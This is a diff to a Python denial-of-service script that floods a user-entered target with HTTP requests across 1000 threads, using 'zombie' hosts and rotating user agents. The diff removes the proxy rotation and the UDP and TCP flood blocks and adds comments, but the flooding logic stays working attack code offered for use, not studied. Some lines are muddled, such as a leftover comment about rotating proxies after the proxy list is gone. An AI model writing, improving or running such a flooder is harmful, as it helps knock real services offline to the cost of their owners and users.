@@ -35,43 +35,43 @@ print(credit)
 
 target_ip = input("Enter the target IP address: ")
 target_port = int(input("Enter the target port: "))
-proxy_list = []
-with open("socks5.txt", "r") as file:
-    for line in file:
-        proxy_ip, proxy_port = line.strip().split(":")
-        proxy_list.append((proxy_ip, int(proxy_port)))
-
+# Read the list of zombies IPs from the txt file
 zombies_list = []
 with open("zombies.txt", "r") as file:
     for line in file:
         zombie_ip = line.strip()
         zombies_list.append(zombie_ip)
 
+# Read the list of user agents from a txt file
 user_agents = []
 with open("ua.txt", "r") as file:
     for line in file:
         user_agents.append(line.strip())
 
+# Number of threads for parallel attacks
 num_threads = 1000
 
+# Number of packets to send in each connection
 num_packets = 1000
 
+# Maximum payload size
 payload_size = 65535
 
+# Initialize a variable to keep track of the attack status
 attack_status = False
 
+# DDoS attack function
 def ddos_attack():
     global attack_status
     while True:
-        proxy_ip, proxy_port = random.choice(proxy_list)
-        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-        socket.socket = socks.socksocket
         try:
-     
+            # Select a random zombie IP from the list
             zombie_ip = random.choice(zombies_list)
 
+            # Randomly select a user agent from the list
             user_agent = random.choice(user_agents)
 
+            # Connect to the zombie
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((zombie_ip, target_port))
 
@@ -82,25 +82,12 @@ def ddos_attack():
             request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
             request += payload_bytes.decode()
 
-            # Send the attack request through the proxy
+            # Send the attack request
             for _ in range(num_packets):
-                socks.sendall(request.encode())
+                s.sendall(request.encode())
 
             # Close the connection with the zombie
             s.close()
-
-            # Perform UDP flood attack
-            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udp_payload = b"A" * payload_size
-            udp_socket.sendto(udp_payload, (zombie_ip, target_port))
-            udp_socket.close()
-
-            # Perform TCP flood attack
-            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            tcp_socket.connect((zombie_ip, target_port))
-            tcp_payload = b"A" * payload_size
-            tcp_socket.sendall(tcp_payload)
-            tcp_socket.close()
 
             # Set the attack status to True once the attack starts
             attack_status = True
@@ -125,4 +112,3 @@ while True:
 
     # Rotate proxies every 10 seconds
     time.sleep(10)
-    random.shuffle(proxy_list)
